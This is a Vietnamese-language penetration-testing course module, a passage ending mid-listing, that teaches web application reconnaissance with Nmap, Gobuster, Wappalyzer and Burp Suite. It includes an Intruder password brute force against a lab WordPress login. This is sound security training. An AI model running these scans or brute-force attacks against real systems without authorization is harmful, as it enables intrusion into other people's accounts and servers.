# Introduction to Web Application Attacks

# Giới thiệu về Tấn công Ứng dụng Web

---

Trong Mô-đun Học tập này, chúng ta sẽ đề cập đến các Đơn vị Học tập sau:

- Phương pháp đánh giá ứng dụng web (Web Application Assessment Methodology)
- Liệt kê ứng dụng web (Web Application Enumeration)
- Cross-Site Scripting

Trong Mô-đun này, chúng ta sẽ bắt đầu giới thiệu các cuộc tấn công vào ứng dụng web. Các framework phát triển hiện đại và giải pháp lưu trữ đã đơn giản hóa quy trình xây dựng và triển khai các ứng dụng dựa trên web. Tuy nhiên, những ứng dụng này thường để lộ một bề mặt tấn công lớn do nhiều phụ thuộc, cấu hình máy chủ không an toàn, thiếu mã ứng dụng trưởng thành, và các lỗi ứng dụng đặc thù nghiệp vụ.

Ứng dụng web được viết bằng nhiều ngôn ngữ lập trình và framework khác nhau, mỗi loại có thể đưa vào những dạng lỗ hổng cụ thể. Vì các lỗ hổng phổ biến nhất giống nhau về khái niệm và các framework khác nhau có hành vi tương tự bất kể nền tảng công nghệ bên dưới, chúng ta sẽ có thể theo đuổi các hướng khai thác tương tự.

---

# 1. Phương pháp Đánh giá Ứng dụng Web

---

Đơn vị Học tập này bao gồm các Mục tiêu Học tập sau:

- Hiểu yêu cầu kiểm thử an ninh ứng dụng web
- Học các loại và phương pháp kiểm thử ứng dụng web khác nhau
- Tìm hiểu về OWASP Top 10 và các lỗ hổng web phổ biến nhất

Trước khi bắt đầu thảo luận về việc liệt kê (enumeration) và khai thác (exploitation), hãy xem xét các phương pháp kiểm thử xâm nhập (penetration testing) ứng dụng web khác nhau.

Là một người kiểm thử xâm nhập, chúng ta có thể đánh giá một ứng dụng web bằng ba phương pháp khác nhau, tùy thuộc vào loại thông tin được cung cấp, phạm vi và các quy tắc cụ thể của cuộc thuê (engagement).

Kiểm thử hộp trắng (White-box testing) mô tả các kịch bản trong đó chúng ta có quyền truy cập không bị ràng buộc vào mã nguồn của ứng dụng, hạ tầng nơi nó nằm, và tài liệu thiết kế của nó. Vì loại kiểm thử này cho chúng ta cái nhìn toàn diện hơn về ứng dụng, nó đòi hỏi một bộ kỹ năng cụ thể để tìm lỗ hổng trong mã nguồn. Các kỹ năng cần thiết cho kiểm thử hộp trắng bao gồm xem xét mã nguồn và logic ứng dụng, cùng các kỹ năng khác. Phương pháp kiểm thử này có thể tốn nhiều thời gian hơn, tương ứng với quy mô cơ sở mã đang được xem xét.

Ngược lại, kiểm thử hộp đen (Black-box testing), còn được gọi là kiểm thử không có kiến thức trước (zero-knowledge test), không cung cấp thông tin về ứng dụng mục tiêu, nghĩa là người kiểm thử cần đầu tư nhiều tài nguyên cho giai đoạn liệt kê (enumeration). Đây là phương pháp được sử dụng trong hầu hết các cuộc tham gia bounty lỗi (bug bounty).

Kiểm thử hộp xám (Grey-box testing) xảy ra khi chúng ta được cung cấp thông tin hạn chế về phạm vi mục tiêu, bao gồm phương thức xác thực, thông tin xác thực (credentials), hoặc chi tiết về framework.

Trong Mô-đun này, chúng ta sẽ tập trung vào kiểm thử hộp đen để giúp phát triển các kỹ năng ứng dụng web mà chúng ta đang học trong khóa học này.

Trong Mô-đun này và các Mô-đun tiếp theo, chúng ta sẽ khám phá việc liệt kê và khai thác các lỗ hổng ứng dụng web. Mặc dù độ phức tạp của lỗ hổng và cuộc tấn công khác nhau, chúng ta sẽ minh họa cách khai thác một số lỗ hổng ứng dụng web phổ biến trong danh sách OWASP Top 10.1

Tổ chức OWASP nhằm mục tiêu cải thiện an ninh phần mềm toàn cầu và, như một phần của mục tiêu này, họ phát triển OWASP Top 10, một danh sách được tổng hợp định kỳ về các rủi ro an ninh quan trọng nhất đối với ứng dụng web.

Hiểu các vectơ tấn công này sẽ đóng vai trò là các khối xây dựng cơ bản để tạo ra các cuộc tấn công nâng cao hơn, như chúng ta sẽ học trong các Mô-đun khác.

---

# 2. Công cụ Đánh giá Ứng dụng Web

---

Đơn vị Học tập này bao gồm các Mục tiêu Học tập sau:

- Thực hiện các kỹ thuật liệt kê phổ biến trên ứng dụng web
- Hiểu lý thuyết về Web Proxies
- Tìm hiểu cách proxy của Burp Suite hoạt động cho kiểm thử ứng dụng web

Trước khi đi sâu vào chi tiết của việc liệt kê ứng dụng web, hãy làm quen với các công cụ chuyên môn. Trong Đơn vị Học tập này, chúng ta sẽ ôn lại Nmap cho việc liệt kê dịch vụ web, cùng với Wappalyzer — một dịch vụ trực tuyến tiết lộ ngăn xếp công nghệ đằng sau một ứng dụng, và Gobuster — một công cụ để phát hiện tệp và thư mục web. Cuối cùng, chúng ta sẽ tập trung vào proxy Burp Suite, công cụ mà chúng ta sẽ phụ thuộc nhiều trong kiểm thử ứng dụng web trong Mô-đun này và các Mô-đun sắp tới.

---

## 2.1. Nhận diện Máy chủ Web bằng Nmap

---

Như đã đề cập trong một Mô-đun trước, Nmap là công cụ hàng đầu cho việc liệt kê (active enumeration) ban đầu. Chúng ta nên bắt đầu liệt kê ứng dụng web từ thành phần cốt lõi của nó — máy chủ web — vì đây là mẫu số chung của bất kỳ ứng dụng web nào phơi bày dịch vụ.

Vì chúng ta tìm thấy cổng 80 mở trên mục tiêu, ta có thể tiến hành khám phá dịch vụ. Để bắt đầu, ta sẽ dựa vào quét dịch vụ của nmap (-sV) để lấy banner máy chủ web (-p80).

```
kali@kali:~$ sudo nmap -p80 -sV 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT
Nmap scan report for 192.168.50.20
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

                              *Danh sách 1 - Chạy quét Nmap để khám phá phiên bản máy chủ web*

Bản quét của chúng ta cho thấy Apache phiên bản 2.4.41 đang chạy trên host Ubuntu.

Để mở rộng việc liệt kê, chúng ta sử dụng các script NSE của Nmap dành riêng cho dịch vụ, như http-enum, script thực hiện nhận diện ban đầu của máy chủ web.

```
kali@kali:~$ sudo nmap -p80 --script=http-enum 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
Nmap scan report for 192.168.50.20
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```

                     *Danh sách 2 - Chạy script NSE http-enum của Nmap chống lại mục tiêu*

Như thấy ở trên, chúng ta đã phát hiện một vài thư mục thú vị có thể dẫn tới thông tin chi tiết hơn về ứng dụng web mục tiêu.

Bằng cách sử dụng các script của Nmap, ta đã khám phá được thêm thông tin đặc thù ứng dụng mà ta có thể thêm vào phần liệt kê máy chủ web đã thực hiện trước đó.

---

## 2.2. Xác định Ngăn xếp Công nghệ bằng Wappalyzer

---

Cùng với việc thu thập thông tin chủ động mà chúng ta đã thực hiện thông qua Nmap, chúng ta cũng có thể thu thập thụ động nhiều thông tin về ngăn xếp công nghệ ứng dụng thông qua Wappalyzer.

Khi đã đăng ký một tài khoản miễn phí, chúng ta có thể thực hiện Tra cứu Công nghệ (Technology Lookup) trên miền [megacorpone.com](http://megacorpone.com/).

![image.png](image.png)

                                                         *Figure 1: Wappalyzer findings*

Từ phân tích nhanh bởi bên thứ ba này, chúng ta biết được về hệ điều hành (OS), framework giao diện người dùng (UI framework), máy chủ web, và nhiều thứ khác. Các kết quả cũng cung cấp thông tin về các thư viện JavaScript được ứng dụng web sử dụng — điều này có thể là dữ liệu quý giá, vì một số phiên bản của thư viện JavaScript được biết là bị ảnh hưởng bởi nhiều lỗ hổng.

---

## 2.3. Brute Force Thư mục bằng Gobuster

---

Khi đã phát hiện một ứng dụng đang chạy trên máy chủ web, bước tiếp theo của chúng ta là lập sơ đồ tất cả các tệp và thư mục có thể truy cập công khai. Để làm điều này, chúng ta cần thực hiện nhiều truy vấn đến mục tiêu để phát hiện bất kỳ đường dẫn ẩn nào. Gobuster là một công cụ (viết bằng ngôn ngữ Go) có thể giúp chúng ta trong dạng liệt kê này. Nó sử dụng các danh sách từ (wordlists) để phát hiện thư mục và tệp trên một server thông qua brute forcing.

*Do tính chất brute forcing của nó, Gobuster có thể tạo ra khá nhiều lưu lượng, nghĩa là nó sẽ không hữu ích khi cần giữ thấp độ nhận diện (stay under the radar).*

Gobuster hỗ trợ các chế độ liệt kê khác nhau, bao gồm fuzzing và dns, nhưng hiện tại, chúng ta chỉ dựa vào chế độ dir, chế độ này liệt kê tệp và thư mục. Ta cần chỉ định IP mục tiêu bằng tham số -u và một wordlist bằng -w. Số threads mặc định là 10; ta có thể giảm lượng traffic bằng cách đặt số nhỏ hơn thông qua tham số -t.

```
kali@kali:~$ gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.20
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/30 05:16:21 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
/db                   (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
/images               (Status: 301) [Size: 315] [--> http://192.168.50.20/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/js                   (Status: 301) [Size: 311] [--> http://192.168.50.20/js/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.50.20/uploads/]

===============================================================
2022/03/30 05:18:08 Finished
===============================================================
```

                                                                *Danh sách 3 - Chạy Gobuster*

Trong thư mục /usr/share/wordlists/dirb/ chúng ta đã chọn wordlist common.txt, và nó đã tìm thấy mười tài nguyên. Bốn trong số các tài nguyên này không thể truy cập do quyền không đủ (Status: 403). Tuy nhiên, sáu tài nguyên còn lại có thể truy cập và xứng đáng được điều tra thêm.

---

## 2.4. Kiểm thử An ninh với Burp Suite

---

Burp Suite là một nền tảng tích hợp dựa trên GUI cho kiểm thử an ninh ứng dụng web. Nó cung cấp nhiều công cụ khác nhau thông qua cùng một giao diện người dùng.

Trong khi bản Community Edition miễn phí chủ yếu chứa các công cụ dùng cho kiểm thử thủ công, các phiên bản thương mại bao gồm các tính năng bổ sung, trong đó có một trình quét lỗ hổng ứng dụng web rất mạnh. Burp Suite có một danh sách tính năng rộng và đáng để tìm hiểu, nhưng ở phần này chúng ta sẽ chỉ khám phá một vài chức năng cơ bản.

Chúng ta có thể tìm Burp Suite Community Edition trong Kali theo *Applications > 03 Web Application Analysis > burpsuite.*

![image.png](image%201.png)

                                                                    *Figure 2: Starting Burp Suite*

Chúng ta cũng có thể khởi chạy nó từ dòng lệnh bằng burpsuite:

```
kali@kali:~$ burpsuite
```

                                               *Danh sách 4 - Khởi động Burp Suite từ terminal shell*

Sau khi khởi chạy ban đầu, chúng ta sẽ thấy một cảnh báo rằng Burp Suite chưa được kiểm tra trên Java Runtime Environment (JRE) của chúng ta. Vì nhóm Kali luôn kiểm tra Burp Suite trên phiên bản Java được đóng gói cùng hệ điều hành, chúng ta có thể an toàn bỏ qua cảnh báo này.

![image.png](image%202.png)

                                                             *Figure 1: Burp Suite JRE warning*

Khi nó khởi động, ta sẽ chọn Temporary project và nhấp Next.

![image.png](image%203.png)

                                                                       *Figure 3: Burp Startup*

Ta giữ nguyên Use Burp defaults được chọn và nhấp Start Burp.

![image.png](image%204.png)

                                                                 *Figure 4: Burp Configuration*

Sau vài khoảnh khắc, giao diện người dùng sẽ được tải.

![image.png](image%205.png)

                                                            *Figure 5: Burp Suite User Interface*

Bốn ô ban đầu của giao diện chủ yếu phục vụ như tóm tắt cho trình quét phiên bản Pro, vì vậy ta có thể bỏ qua chúng. Thay vào đó, ta sẽ tập trung vào các tính năng có trên các tab ở thanh trên cùng.

Hãy bắt đầu với công cụ Proxy. Nói chung, một web proxy là bất kỳ phần cứng hoặc phần mềm chuyên dụng nào dùng để chặn (intercept) các yêu cầu và/hoặc phản hồi giữa client web và server web. Điều này cho phép cả quản trị viên và người kiểm thử sửa đổi bất kỳ yêu cầu nào bị chặn bởi proxy, cả theo cách thủ công lẫn tự động.

*Một số web proxy được dùng để chặn và giải mã (inspect) lưu lượng TLS toàn công ty. Được biết đến như thiết bị TLS inspection, chúng thực hiện giải mã và mã lại lưu lượng và do đó làm vô hiệu lớp bảo mật riêng tư mà giao thức HTTPS cung cấp.*

Với công cụ Burp Proxy, chúng ta có thể chặn bất kỳ yêu cầu nào được gửi từ trình duyệt trước khi nó được chuyển tiếp đến server. Tại thời điểm này, chúng ta có thể thay đổi gần như mọi thứ về yêu cầu, chẳng hạn tên tham số hoặc giá trị form. Chúng ta thậm chí có thể thêm header mới. Điều này cho phép ta kiểm thử cách một ứng dụng xử lý các đầu vào tùy ý không mong đợi. Ví dụ, một trường nhập có thể bị giới hạn kích thước 20 ký tự, nhưng ta có thể dùng Burp Suite để sửa yêu cầu nhằm gửi 30 ký tự.

Để thiết lập proxy, trước tiên ta sẽ nhấp tab Proxy để hiển thị một số sub-tab. Ta cũng sẽ tắt công cụ Intercept, nằm trong tab Intercept.

*Khi Intercept được bật, ta phải nhấp Forward thủ công để gửi từng yêu cầu tới đích. Ngoài ra, ta có thể nhấp Drop để không gửi yêu cầu. Có những lúc ta muốn chặn lưu lượng và sửa nó, nhưng khi chỉ duyệt web thì phải nhấp Forward cho mỗi yêu cầu sẽ rất mệt mỏi.*

![image.png](image%206.png)

                                                                 *Figure 6: Turning Off Intercept*

Tiếp theo, ta có thể xem lại cài đặt listener proxy. Sub-tab Options hiển thị các cổng đang lắng nghe các yêu cầu proxy.

![image.png](image%207.png)

                                                                        *Figure 7: Proxy Listeners*

Mặc định, Burp Suite bật một proxy listener trên localhost:8080. Đây là host và port mà trình duyệt của chúng ta phải kết nối để gửi traffic qua Burp Suite.

*Burp Suite hiện được đóng gói với trình duyệt gốc dựa trên Chromium của chính nó, được cấu hình sẵn để làm việc với tất cả các tính năng của Burp. Tuy nhiên, cho khóa học này chúng ta sẽ chỉ sử dụng trình duyệt Firefox của Kali vì nó linh hoạt và mô-đun hơn.*

Hãy minh họa cách cấu hình máy Kali cục bộ với trình duyệt Firefox để sử dụng Burp Suite làm proxy.

Trong Firefox, ta làm điều này bằng cách điều hướng đến about:preferences#general, cuộn xuống Network Settings, rồi nhấp Settings.

Ta chọn tùy chọn Manual, đặt địa chỉ IP và port lắng nghe phù hợp. Trong trường hợp của chúng ta, proxy (Burp) và trình duyệt nằm trên cùng một host, vì vậy chúng ta sẽ dùng loopback IP 127.0.0.1 và chỉ định port 8080.

*Trong một vài kịch bản kiểm thử, chúng ta có thể muốn bắt lưu lượng từ nhiều máy, vì vậy proxy sẽ được cấu hình trên một IP độc lập. Trong những trường hợp đó, ta sẽ cấu hình trình duyệt với IP bên ngoài của proxy.*

Cuối cùng, ta cũng muốn bật proxy server này cho tất cả các tùy chọn giao thức để đảm bảo rằng có thể chặn mọi yêu cầu khi kiểm thử ứng dụng mục tiêu.

![image.png](image%208.png)

                                                         *Figure 8: Firefox Proxy Configuration.*

Khi Burp được cấu hình làm proxy trên trình duyệt, ta có thể đóng các tab Firefox thừa và duyệt tới [http://www.megacorpone.com](http://www.megacorpone.com/). Ta sẽ tìm thấy lưu lượng bị chặn trong Burp Suite dưới Proxy > HTTP History.

![image.png](image%209.png)

                                                          *Figure 9: Burp Suite HTTP History*

Giờ ta có thể xem lại các yêu cầu khác nhau mà trình duyệt đã thực hiện tới trang web mục tiêu.

*Nếu trình duyệt bị treo khi tải trang, có thể Intercept đang bật. Tắt nó sẽ cho phép lưu lượng chảy mà không bị gián đoạn. Khi ta duyệt tới thêm các trang, ta sẽ quan sát nhiều yêu cầu hơn trong tab HTTP History.*

Bằng cách nhấp vào một trong các yêu cầu, toàn bộ dump của client request và server response được hiển thị ở nửa dưới giao diện Burp.

![image.png](image%2010.png)

                                               *Figure 10: Inspecting the first HTTP request.*

Ở khung bên trái ta có thể xem chi tiết yêu cầu của client, với phản hồi của server ở khung bên phải. Với tính năng mạnh mẽ này của Burp, ta có thể kiểm tra mọi chi tiết của từng yêu cầu được thực hiện, cùng với phản hồi. Chúng ta sẽ sử dụng tính năng này thường xuyên trong các Mô-đun sắp tới.

*Tại sao "detectportal.firefox.com" cứ xuất hiện trong lịch sử proxy? Một captive portal3 là một trang web đóng vai trò như một trang cổng khi cố gắng lướt Internet. Nó thường hiển thị khi chấp nhận thỏa thuận người dùng hoặc xác thực qua trình duyệt vào một mạng Wi-Fi. Để bỏ qua điều này, chỉ cần nhập about:config vào thanh địa chỉ. Firefox sẽ đưa ra một cảnh báo, nhưng ta có thể tiếp tục bằng cách nhấp I accept the risk!. Cuối cùng, tìm "network.captive-portal-service.enabled" và nhấp đúp để đổi giá trị thành "false". Điều này sẽ ngăn những thông báo này xuất hiện trong lịch sử proxy.*

Bên cạnh tính năng Proxy, Repeater là một công cụ Burp cơ bản khác. Với Repeater, ta có thể tạo các yêu cầu mới hoặc dễ dàng sửa những yêu cầu có trong History, gửi lại chúng, và xem lại các phản hồi. Để quan sát điều này hoạt động, ta có thể nhấp phải một request trong Proxy > HTTP History và chọn Send to Repeater.

![image.png](image%2011.png)

                                                     *Figure 11: Sending a Request to Repeater*

Nếu ta nhấp vào Repeater, ta sẽ thấy một sub-tab với yêu cầu ở bên trái cửa sổ. Ta có thể gửi nhiều yêu cầu tới Repeater và nó sẽ hiển thị chúng dưới dạng các tab riêng biệt. Hãy gửi yêu cầu tới server bằng cách nhấp Send.

![image.png](image%2012.png)

                                                                 *Figure 12: Burp Suite Repeater*

Burp Suite sẽ hiển thị phản hồi thô từ server ở bên phải cửa sổ, bao gồm cả header phản hồi và nội dung phản hồi chưa được render.

![image.png](image%2013.png)

                                     *Figure 13: Burp Suite Repeater with Request and Response*

Tính năng cuối cùng chúng ta sẽ đề cập là Intruder, nhưng trước hết, ta cần cấu hình file hosts cục bộ của Kali để gán tĩnh IP tới website offsecwp mà ta sẽ kiểm thử.

```
kali@kali:~$ cat /etc/hosts

...
192.168.50.16 offsecwp
```

                                           *Danh sách 5 - Thiết lập file /etc/hosts cho offsecwp*

Tính năng Intruder của Burp, như tên gọi, được thiết kế để tự động hóa nhiều góc tấn công khác nhau, từ đơn giản tới phức tạp hơn của ứng dụng web. Để tìm hiểu thêm về tính năng này, hãy mô phỏng một cuộc tấn công brute force mật khẩu.

Vì ta đang làm việc với một mục tiêu mới, ta có thể bắt đầu một phiên Burp mới và cấu hình Proxy như trước. Tiếp theo, ta sẽ điều hướng tới [http://offsecwp/wp-login.php](http://offsecwp/wp-login.php) từ Firefox. Rồi ta sẽ nhập "admin" và "test" lần lượt làm tên người dùng và mật khẩu, và nhấp Log in.

![image.png](image%2014.png)

                                               *Figure 14: Simulating a failed WordPress login*

Quay trở lại Burp, ta điều hướng tới Proxy > HTTP History, nhấp phải trên POST request tới /wp-login.php và chọn Send to Intruder.

![image.png](image%2015.png)

                                             *Figure 15: Sending the POST request to Intruder*

Bây giờ ta có thể chọn tab Intruder ở thanh trên, chọn POST request ta muốn sửa, và chuyển tới sub-tab Positions. Biết rằng user admin là đúng, ta chỉ cần brute force trường mật khẩu. Trước tiên, ta nhấn Clear ở thanh phải để xóa hết các vị trí. Sau đó, ta chọn giá trị của key pwd và nhấn Add ở bên phải.

![image.png](image%2016.png)

                      *Figure 15: Assigning the password value to the Intruder payload generator*

Ta đã hướng dẫn Intruder chỉ sửa đổi giá trị mật khẩu trên mỗi yêu cầu mới. Trước khi bắt đầu tấn công, hãy cung cấp cho Intruder một wordlist. Biết rằng mật khẩu đúng là "password", ta có thể lấy 10 giá trị đầu tiên từ wordlist rockyou trên Kali.

```
kali@kali:~$ cat /usr/share/wordlists/rockyou.txt | head
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```

                               *Danh sách 6 - Sao chép 10 mục đầu tiên của rockyou wordlist*

Chuyển sang sub-tab Payloads, ta dán danh sách wordlist trên vào khu vực Payload Options[Simple list].

![image.png](image%2017.png)

                                                   *Figure 15: Pasting the first 10 rockyou entries*

Với mọi thứ sẵn sàng để bắt đầu tấn công Intruder, hãy nhấp nút Start Attack ở góc trên bên phải.

Ta có thể bỏ qua cảnh báo của Burp về các tính năng Intruder bị hạn chế, vì điều này sẽ không ảnh hưởng tới tấn công. Sau khi để tấn công hoàn tất, ta có thể quan sát rằng ngoài yêu cầu dò ban đầu, nó thực hiện 10 yêu cầu, mỗi yêu cầu ứng với một mục trong wordlist được cung cấp.

![image.png](image%2018.png)

                                            *Figure 15: Inspecting Intruder's attack results*

Ta sẽ nhận thấy rằng ứng dụng WordPress trả về mã trạng thái khác ở yêu cầu thứ 4, gợi ý rằng đây có thể là giá trị mật khẩu đúng. Giả thuyết của chúng ta được xác nhận khi ta thử đăng nhập vào bảng điều khiển quản trị WordPress với mật khẩu tìm được.

![image.png](image%2019.png)

                                                *Figure 15: Logging to the WP admin console*

Giờ khi đã xây dựng kiến thức nền tảng vững chắc về cách Burp và các công cụ đánh giá khác hoạt động, hãy tiến bước tiếp theo và học cách liệt kê (enumerate) một ứng dụng web mục tiêu.

---

# 3. Liệt kê Ứng dụng Web

---

Đơn vị Học tập này bao gồm các Mục tiêu Học tập sau:

- Học cách gỡ lỗi (debug) mã nguồn Ứng dụng Web
- Hiểu cách liệt kê và kiểm tra Headers, Cookies và Source Code
- Học cách thực hiện các phương pháp kiểm thử API

Trong một Mô-đun trước, chúng ta đã tìm hiểu cách thu thập thông tin thụ động có thể đóng vai trò then chốt khi lập bản đồ ứng dụng web, đặc biệt khi các kho lưu trữ công khai hoặc Google dorks tiết lộ thông tin nhạy cảm về mục tiêu của chúng ta. Dù làm việc với thông tin xác thực bị lộ hay chỉ là tài liệu ứng dụng, chúng ta luôn nên tham chiếu đến thông tin thu thập được một cách thụ động trong quá trình kiểm thử ứng dụng web chủ động, vì nó có thể dẫn tới những đường đi chưa được khám phá.

Điều quan trọng là phải xác định các thành phần tạo nên một ứng dụng web trước khi cố gắng khai thác nó một cách mù quáng. Nhiều lỗ hổng ứng dụng web không phụ thuộc vào công nghệ. Tuy nhiên, một số khai thác và payload cần được tạo dựa trên nền tảng công nghệ của ứng dụng, chẳng hạn phần mềm cơ sở dữ liệu hoặc hệ điều hành. Trước khi phát động bất kỳ cuộc tấn công nào vào một ứng dụng web, chúng ta nên cố gắng khám phá ngăn xếp công nghệ đang sử dụng. Ngăn xếp công nghệ thường bao gồm hệ điều hành máy chủ, phần mềm máy chủ web, phần mềm cơ sở dữ liệu, và ngôn ngữ lập trình frontend/backend.

Khi đã liệt kê được ngăn xếp nền tảng bằng các phương pháp đã học ở trên, chúng ta sẽ tiến sang liệt kê ứng dụng.

Chúng ta có thể tận dụng một số kỹ thuật để thu thập thông tin này trực tiếp từ trình duyệt. Hầu hết các trình duyệt hiện đại đều bao gồm công cụ dành cho nhà phát triển (developer tools) có thể hỗ trợ quá trình liệt kê.

Như tên gọi, mặc dù Developer Tools thường được các nhà phát triển sử dụng, chúng hữu ích cho mục đích của chúng ta vì chúng cung cấp thông tin về hoạt động nội bộ của ứng dụng mục tiêu.

Chúng ta sẽ tập trung vào Firefox vì nó là trình duyệt mặc định trong Kali Linux. Tuy nhiên, hầu hết các trình duyệt đều có các công cụ tương tự.

---

## 3.1. Gỡ lỗi Nội dung Trang

---

Một điểm khởi đầu tốt để lập bản đồ thông tin ứng dụng web là một địa chỉ URL. Phần mở rộng tệp, đôi khi là một phần của URL, có thể tiết lộ ngôn ngữ lập trình mà ứng dụng được viết bằng. Một số phần mở rộng, như .php, rất rõ ràng, nhưng những phần khác thì bí ẩn hơn và thay đổi tùy theo framework đang sử dụng. Ví dụ, một ứng dụng web dựa trên Java có thể sử dụng .jsp, .do, hoặc .html.

Tuy nhiên, phần mở rộng tệp trên các trang web ngày càng ít xuất hiện, vì nhiều ngôn ngữ và framework hiện hỗ trợ khái niệm routes, cho phép nhà phát triển ánh xạ một URI tới một đoạn mã. Các ứng dụng sử dụng routes dùng logic để xác định nội dung nào được trả về cho người dùng, khiến phần mở rộng URI trở nên ít liên quan.

Mặc dù việc kiểm tra URL có thể cung cấp một số manh mối về ứng dụng web mục tiêu, hầu hết các tín hiệu ngữ cảnh có thể được tìm thấy trong mã nguồn của trang web. Công cụ Firefox Debugger (có trong menu Web Developer) hiển thị các tài nguyên và nội dung của trang, vốn thay đổi theo từng ứng dụng. Công cụ Debugger có thể hiển thị các framework JavaScript, các trường input ẩn, comment, các điều khiển phía client trong HTML, JavaScript, và nhiều thứ khác.

Hãy thử điều này bằng cách mở Debugger khi duyệt ứng dụng offsecwp:

![image.png](image%2020.png)

                                  *Figure 16: Using Developer Tools to Inspect JavaScript Sources*

Chúng ta sẽ nhận thấy ứng dụng sử dụng jQuery2 phiên bản 3.6.0, một thư viện JavaScript phổ biến. Trong trường hợp này, nhà phát triển đã minified mã, làm cho nó gọn hơn và tiết kiệm tài nguyên, đồng thời cũng khiến nó khá khó đọc. May mắn thay, chúng ta có thể "prettify" mã trong Firefox bằng cách nhấp vào nút Pretty print source với biểu tượng hai ngoặc nhọn:

![image.png](image%2021.png)

                                                                   *Figure 17: Pretty Print Source*

Sau khi nhấp vào biểu tượng, Firefox sẽ hiển thị mã ở định dạng dễ đọc và dễ theo dõi hơn:

![image.png](image%2022.png)

                                                     *Figure 18: Viewing Prettified Source in Firefox*

Chúng ta cũng có thể sử dụng công cụ Inspector để khoan sâu vào nội dung trang cụ thể. Hãy dùng Inspector để kiểm tra phần tử input tìm kiếm từ trang chủ WordPress bằng cách cuộn, nhấp phải vào trường tìm kiếm trên trang và chọn Inspect.

![image.png](image%2023.png)

                                                         *Figure 19: Selecting E-mail Input Element*

Điều này sẽ mở công cụ Inspector và làm nổi bật HTML cho phần tử mà chúng ta đã nhấp phải.

![image.png](image%2024.png)

                                                          *Figure 20: Using the Inspector Tool*

Công cụ này đặc biệt hữu ích để nhanh chóng tìm các trường form ẩn trong mã nguồn HTML.

Giờ khi chúng ta đã quen với cách sử dụng debugger tích hợp của trình duyệt, chúng ta sẽ học cách sử dụng công cụ Network và Burp Proxy để kiểm tra các header phản hồi HTTP.

---

## 3.2. Kiểm tra Header Phản hồi HTTP và Sơ đồ Trang

---

Chúng ta cũng có thể tìm kiếm thêm thông tin trong các phản hồi của server. Có hai loại công cụ có thể dùng để thực hiện nhiệm vụ này. Loại đầu tiên là proxy, như Burp Suite, chặn yêu cầu và phản hồi giữa client và server web, và loại còn lại là công cụ Network (Mạng) của chính trình duyệt.

Chúng ta sẽ khám phá cả hai cách tiếp cận trong Mô-đun này, nhưng hãy bắt đầu bằng cách minh họa công cụ Network. Ta có thể khởi chạy nó từ menu Web Developer của Firefox để xem các yêu cầu và phản hồi HTTP. Công cụ này hiển thị hoạt động mạng xảy ra sau khi nó được bật, vì vậy chúng ta phải làm mới trang để hiển thị lưu lượng.

![image.png](image%2025.png)

                                           *Figure 21: Using the Network Tool to View Requests*

Ta có thể nhấp vào một yêu cầu để xem chi tiết hơn về nó. Trong trường hợp này, chúng ta muốn kiểm tra các header phản hồi. Header phản hồi là một tập con của HTTP headers1 được gửi trong phản hồi cho một yêu cầu HTTP.

![image.png](image%2026.png)

                                     *Figure 22: Viewing Response Headers in the Network Tool*

Header Server hiển thị ở trên thường sẽ tiết lộ ít nhất tên phần mềm máy chủ web. Trong nhiều cấu hình mặc định, nó cũng tiết lộ số phiên bản.

*HTTP headers không phải lúc nào cũng được tạo ra chỉ bởi máy chủ web. Ví dụ, các web proxy chủ động chèn header X-Forwarded-For để báo cho máy chủ web biết địa chỉ IP gốc của client.*

Về mặt lịch sử, những header bắt đầu bằng "X-" được gọi là header HTTP không chuẩn. Tuy nhiên, RFC66483 hiện đã không khuyến khích việc sử dụng "X-" và ưu tiên một quy ước đặt tên rõ ràng hơn.

Tên hoặc giá trị trong header phản hồi thường tiết lộ thêm thông tin về ngăn xếp công nghệ được ứng dụng sử dụng. Một vài ví dụ về header không chuẩn gồm X-Powered-By, x-amz-cf-id và X-Aspnet-Version. Nghiên cứu thêm về những tên này có thể tiết lộ thông tin bổ sung, chẳng hạn header "x-amz-cf-id" cho thấy ứng dụng sử dụng Amazon CloudFront.4

Sitemaps là một yếu tố quan trọng khác mà ta nên cân nhắc khi liệt kê ứng dụng web.

Ứng dụng web có thể bao gồm các tệp sitemap để giúp bot công cụ tìm kiếm thu thập và lập chỉ mục trang web của họ. Những tệp này cũng có thể chứa chỉ thị về những URL không nên được thu thập — thường là các trang nhạy cảm hoặc bảng điều khiển quản trị, vốn chính là loại trang mà chúng ta quan tâm.

Chỉ thị bao gồm được thực hiện bằng giao thức sitemaps5, trong khi robots.txt loại trừ các URL khỏi việc bị thu thập.

Ví dụ, ta có thể lấy tệp robots.txt từ [www.google.com](http://www.google.com/) bằng curl:

```
kali@kali:~$ curl https://www.google.com/robots.txt
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
